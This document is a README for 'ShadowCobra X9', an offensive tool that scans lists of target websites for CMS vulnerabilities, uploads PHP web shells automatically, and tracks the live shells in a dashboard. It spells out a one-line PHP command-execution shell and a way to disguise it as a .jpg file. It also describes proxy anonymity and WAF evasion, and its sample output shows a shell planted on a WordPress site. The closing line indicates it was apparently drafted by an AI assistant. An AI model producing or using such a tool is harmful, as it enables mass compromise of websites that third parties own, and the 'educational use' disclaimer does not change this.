ShadowCobra X9 Vulnerability Scanner
� � �
ShadowCobra X9 Vulnerability Scanner is a hybrid, advanced Python-based tool designed for educational purposes and authorized security testing. It combines the strengths of CVE-based vulnerability scanning (inspired by CobraX9++) and automated shell upload detection (inspired by ShadowUploader v3). This tool scans websites for known vulnerabilities, attempts to upload proof-of-concept (PoC) shells, and verifies live shells with a real-time dashboard.
Note: This tool is intended for educational use or authorized penetration testing on systems you own or have explicit permission to test. Unauthorized use is illegal and unethical.
Features
Modular CVE Scanning: Detects vulnerabilities across popular CMS platforms (e.g., WordPress, Laravel) using a predefined CVE database.
Auto Shell Uploader: Automatically attempts to upload shell files to vulnerable endpoints and verifies their execution.
Multi-Threaded: Utilizes concurrent scanning with up to 20 threads for efficiency.
Live Shell Dashboard: Displays verified live shells in a Tkinter-based GUI.
Proxy Support: Integrates with a proxy list for anonymous scanning.
Detailed Reporting: Logs vulnerable URLs, live shells, and debug information to files.
WAF Evasion: Randomizes headers to mimic legitimate browser traffic.
Requirements
Python: 3.7 or higher
Dependencies:
requests
colorama
tqdm
Install via: pip install requests colorama tqdm
Installation
Clone the Repository:
git clone https://github.com/yourusername/shadowcobra-x9.git
cd shadowcobra-x9
Install Dependencies:
pip install -r requirements.txt
(Create a requirements.txt file with the above dependencies if not included.)
Prepare Files:
targets.txt: Create a file containing target domains/URLs (one per line, e.g., example.com).
proxy.txt (optional): Add a list of proxies (e.g., socks5://192.168.1.1:9050) for anonymity.
shadow.php: Create a PHP shell (e.g., <?php system($_GET['cmd']); ?>).
shell.php.jpg: Rename a copy of shadow.php to disguise it (e.g., cp shadow.php shell.php.jpg).
Usage
Run the script with the following command-line options:
python shadowcobra_x9.py [options]
Options
--silent: Run in silent mode (suppress output except for live shell detections).
--cmd <command>: Specify a command to execute via the shell (default: whoami).
--https: Force HTTPS requests instead of HTTP.
Examples
Basic Scan:
python shadowcobra_x9.py
Scans targets from targets.txt with HTTP and displays results.
Silent Mode with Custom Command:
python shadowcobra_x9.py --silent --cmd "id"
Runs quietly, testing with the id command.
Force HTTPS:
python shadowcobra_x9.py --https
Scans using HTTPS for all targets.
Output
Terminal: Color-coded results (e.g., [VULNERABLE], [SAFE], [!!!] LIVE SHELL).
Files:
live_shells.txt: Contains verified live shell URLs.
debug_shell_hits.txt: Logs potential shell hits for debugging.
Dashboard: A Tkinter window displays live shells in real-time.
Sample Output
╦═╗┬ ┬┌─┐┌─┐┬ ┬┬ ┬┬┌┬┐┌─┐┬─┐
╠╦╝│ ││  ├┤ ├─┤│ ││ │ ├┤ ├┬┘
╩╚═┴─┴└─┘└─┘┴ ┴└─┘┴ ┴ └─┘┴└─
   ShadowCobra X9 Vulnerability Scanner
        Hybrid Edition by ShadowHax (2025)

[*] Scanning http://example.com
[VULNERABLE] http://example.com → CVE-2025-26892 (WordPress Celestial Aura Theme v2.2)
[+] Uploaded shadow.php to: http://example.com/wp-content/themes/celestial-aura/upload.php
[!!!] LIVE SHELL (Verified www-data): http://example.com/wp-content/uploads/shadow.php?cmd=whoami
  Redirect chain: http://example.com/wp-content/uploads/shadow.php (final)
  -> http://example.com/wp-content/uploads/shadow.php (status: 302)
Contributing
Fork the repository.
Create a feature branch (git checkout -b feature-name).
Commit your changes (git commit -m "Add feature-name").
Push to the branch (git push origin feature-name).
Open a Pull Request.
Adding CVEs
Extend the CVE_MODULES list in the script with new vulnerabilities (fingerprint, regex, upload endpoint).
Test thoroughly on a controlled environment.
License
This project is licensed under the MIT License - see the LICENSE file for details.
Disclaimer
Educational Use Only: This tool is intended for learning purposes or authorized security testing on systems you own or have explicit permission to assess.
Legal Warning: Unauthorized use against systems you do not own or have permission to test is illegal and may result in severe legal consequences. The developers are not responsible for any misuse or damage caused by this tool.
As-Is: Use at your own risk. No warranty is provided.
Acknowledgments
Inspired by CobraX9++ and ShadowUploader v3.
Built with love by ShadowHax on September 03, 2025.
Notes
Customization: Replace https://github.com/yourusername/shadowcobra-x9.git with your actual GitHub repository URL.
LICENSE File: Create a LICENSE file with the MIT License text if you choose to use it.
requirements.txt: Add a file with requests, colorama, tqdm to simplify dependency installation.
Testing: Test on a local virtual machine or a dedicated test server to avoid legal issues.
Let me know if you’d like to adjust the content (e.g., add more sections, change the license, or include specific contributors)! 😎
